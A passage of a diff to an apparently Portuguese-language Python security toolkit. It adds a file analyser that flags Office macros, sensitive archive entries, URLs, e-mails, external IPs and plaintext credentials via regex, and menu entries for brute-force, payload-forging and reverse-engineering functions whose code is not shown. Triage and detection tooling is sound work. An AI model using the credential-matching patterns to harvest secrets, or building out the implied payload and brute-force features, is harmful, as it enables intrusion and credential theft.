+                    print(f"[INFO] Classificado como JAR ({len(file_list)} classes/arquivos).")
+                elif is_office:
+                    file_type = "Documento Office (ZIP-based)"
+                    print(f"[INFO] Classificado como Documento Office.")
+                    # Verifica macros
+                    macros = [f for f in file_list if 'vbaProject' in f]
+                    if macros:
+                        print(f"{RED}[ALERTA]{RESET} Macros VBA detectadas: {macros}")
+                else:
+                    print(f"[INFO] ZIP genérico ({len(file_list)} arquivos).")
+                
+                # Lista arquivos se for pequeno ou se usuário pedir 
+                if len(file_list) <= 20:
+                    print("Conteúdo do ZIP:")
+                    for f in file_list:
+                        print(f"  - {f}")
+                else:
+                    print(f"Primeiros 10 arquivos do ZIP:")
+                    for f in file_list[:10]:
+                        print(f"  - {f}")
+                    print(f"  ... e mais {len(file_list) - 10} arquivos.")
+                    
+                # Verificação de sensibilidade em nomes de arquivos
+                sensitive_files = [f for f in file_list if any(kw in f.lower() for kw in ['config', 'manifest', 'security', 'key', 'cert'])]
+                if sensitive_files:
+                    print(f"{YELLOW}[INFO]{RESET} Arquivos potencialmente sensíveis detectados:")
+                    for sf in sensitive_files[:5]:
+                        print(f"  - {sf}")
+
+        except zipfile.BadZipFile:
+            print(f"{YELLOW}[WARN]{RESET} Arquivo ZIP inválido ou corrompido.")
+
+    # --- Texto Genérico / HTML / JSON ---
+    elif file_path.lower().endswith(('.txt', '.md', '.log', '.html', '.htm', '.json', '.xml', '.csv')) or (data[:1] in [b'{', b'[', b'<'] and all(b > 31 or b in (9, 10, 13) for b in data[:100])):
+        file_type = "Texto Estruturado (HTML/JSON/XML/TXT)"
+        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Texto Estruturado.")
+        
+        # Detecção de padrões sensíveis em texto
+        text_data = data.decode('utf-8', errors='ignore')
+        
+        # URLs
+        urls = re.findall(r'https?://[^\s<>"]+[^.,\)\]\s]', text_data)
+        if urls:
+            print(f"{BLUE}[INFO]{RESET} URLs encontradas ({len(urls)}):")
+            for url in list(set(urls))[:10]:
+                print(f"  - {url}")
+        
+        # E-mails
+        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text_data)
+        if emails:
+            print(f"{BLUE}[INFO]{RESET} E-mails encontrados ({len(emails)}):")
+            for email in list(set(emails))[:5]:
+                print(f"  - {email}")
+        
+        # IPs
+        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text_data)
+        if ips:
+            # Filtra IPs comuns de loopback ou privados para focar em externos
+            interesting_ips = [ip for ip in ips if not ip.startswith(('127.', '10.', '192.168.'))]
+            if interesting_ips:
+                print(f"{BLUE}[INFO]{RESET} IPs externos encontrados ({len(interesting_ips)}):")
+                for ip in list(set(interesting_ips))[:5]:
+                    print(f"  - {ip}")
+                    
+        # Senhas em texto plano (heurística simples)
+        password_patterns = re.findall(r'(?i)(password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]\s*["\']?([^\s"\']{4,})', text_data)
+        if password_patterns:
+            print(f"{RED}[ALERTA]{RESET} Possíveis credenciais em texto plano detectadas:")
+            for key, val in password_patterns[:5]:
+                print(f"  - {key}: {val[:20]}{'...' if len(val) > 20 else ''}")
+
+    else:
+        print(f"{YELLOW}[INFO]{RESET} Tipo de arquivo não específico. Análise baseada apenas em entropia e strings.")
+
+    # 6. RESUMO EXECUTIVO
+    print("\n" + "="*20)
+    print(" 📊 RESUMO EXECUTIVO")
+    print("="*20)
+    print(f"Arquivo: {os.path.basename(file_path)}")
+    print(f"Tipo: {file_type}")
+    print(f"SHA-256: {hashes['sha256']}")
+    print(f"Entropia: {entropy:.4f}")
+    
+    if found_packer:
+        print(f"Packer: {found_packer}")
+        
+    if interesting_strings:
+        print(f"Strings Críticas: {len(interesting_strings)}")
+        
+    print(f"\n{GREEN}[CONCLUÍDO]{RESET} Análise finalizada.")
+    print("="*50)
+               
 
 if option == 1:
     analise()
@@ -2926,5 +3830,9 @@ elif option == 8:
     manual()
 elif option == 9:
     brute_force()
+elif option == 10:
+    payload_forge()
+elif option == 11:
+    reverse_engineer()
 else:
     print("Opção invalida porfavor digite outro numero")
